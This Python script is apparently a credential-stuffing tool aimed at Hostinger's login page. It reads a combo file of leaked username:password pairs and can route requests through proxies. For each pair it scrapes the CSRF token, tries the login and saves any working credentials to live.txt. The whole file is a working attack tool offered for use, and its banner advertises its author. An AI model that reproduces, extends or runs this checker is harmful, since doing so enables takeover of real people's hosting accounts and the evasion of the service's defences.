import requests
import re
from colorama import Fore, Style
from os import system, name

def clear():
    """Clears the console screen."""
    # For Windows
    if name == 'nt':
        _ = system('cls')
    # For macOS and Linux (here, os.name is 'posix')
    else:
        _ = system('clear')

clear()

# --- Banner ---
print(Fore.YELLOW + "██░ ██  ▒█████   ██████ ▄▄▄█████▓ ██▓ ███▄    █    ▄████ ▓█████  ██▀███  ")
print("▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▓██▒ ██ ▀█    █  ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒")
print("▒██▀▀██░▒██░  ██▒ ▓██▄    ▒ ▓██░ ▒░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒")
print("░▓█ ░██ ▒██   ██░  ▒   ██▒  ▓██▓ ░ ░██░▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  ")
print("░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░██░▒██░   ▓██░░▒▓███▀▒░▒████▒░██▓ ▒██▒")
print(" ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ▒░   ▒ ▒  ░▒   ▒  ░ ▒░  ░░ ▒▓ ░▒▓░")
print(" ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░     ▒ ░  ░░   ░ ▒░  ░   ░   ░ ░   ░▒ ░ ▒░")
print(" ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░     ▒ ░   ░   ░ ░   ░ ░   ░     ░   ░░   ░ ")
print(" ░  ░  ░    ░ ░        ░          ░           ░       ░           ░  " + Style.RESET_ALL)
print("                             CODE BY @schtshop                                          ")
print(Fore.RED + "==========================================================================")
print("|          FOLLOW MY FACEBOOK: https://www.facebook.com/scht.id          |")
print("==========================================================================" + Style.RESET_ALL)


def login(username, password, proxies=None):
    """Logs in to the Hostinger account and records the result with colors using colorama."""


    url = "https://auth.hostinger.in/login?_gl=1*13rm9n6*"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    try:
        response = requests.get(url, headers=headers, proxies=proxies)
        value_match = re.search(r'_token".*value="(.*?)"', response.text)
        if value_match:
            value = value_match.group(1)
            token_match = re.search(r'value="(.*?)"', value)
            if token_match:
                token = token_match.group(1)
                data = {
                    "_token": token,
                    "email": username,
                    "password": password,
                    "screen_color_depth": "24",
                    "screen_height": "1000",
                    "screen_width": "1600",
                    "window_height": "469",
                    "window_width": "1600",
                    "is_cookie_support_enabled": "1"
                }

                response = requests.post(url, headers=headers, data=data, proxies=proxies)
                if "incorrect" in response.text:
                    print(Fore.RED + f"Die => {username}:{password}" + Style.RESET_ALL)
                elif "remember_login_token" in response.cookies:
                    print(Fore.GREEN + f"Live => {username}:{password}" + Style.RESET_ALL)
                    record_result(username, password, "live")
                else:
                    print(f"Login failed for {username}: Unknown reason")
            else:
                print("Failed to extract token from 'value' attribute.")
        else:
            print("Failed to find '_token' input field.")

    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")


def record_result(username, password, status):
    """Records the login result to the appropriate file."""
    with open(f"{status}.txt", "a") as f:
        f.write(f"{username}:{password}\n")


# --- Input nama file combo ---
while True:
    nama_file_combo = input("Input Your Combo: ")
    try:
        with open(nama_file_combo, "r") as f:
            # --- Pilihan menggunakan proxy ---
            gunakan_proxy = input("With proxy? (y/n): ")
            if gunakan_proxy.lower() == "y":
                nama_file_proxy = input("Input Proxy file: ")
                try:
                    with open(nama_file_proxy, "r") as p:
                        proxies = {}
                        for line in p:
                            proxy = line.strip()
                            proxies['http'] = f'http://{proxy}'
                            proxies['https'] = f'http://{proxy}'
                            for line in f:
                                try:
                                    username, password = line.strip().split(":")
                                    login(username, password, proxies)
                                except ValueError:
                                    print(f"Invalid combo format in line: {line.strip()}")
                except FileNotFoundError:
                    print(f"File proxy '{nama_file_proxy}' tidak ditemukan.")
            else:
                for line in f:
                    try:
                        username, password = line.strip().split(":")
                        login(username, password)
                    except ValueError:
                        print(f"Invalid combo format in line: {line.strip()}")
        break
    except FileNotFoundError:
        print(f"File combo '{nama_file_combo}' tidak ditemukan.")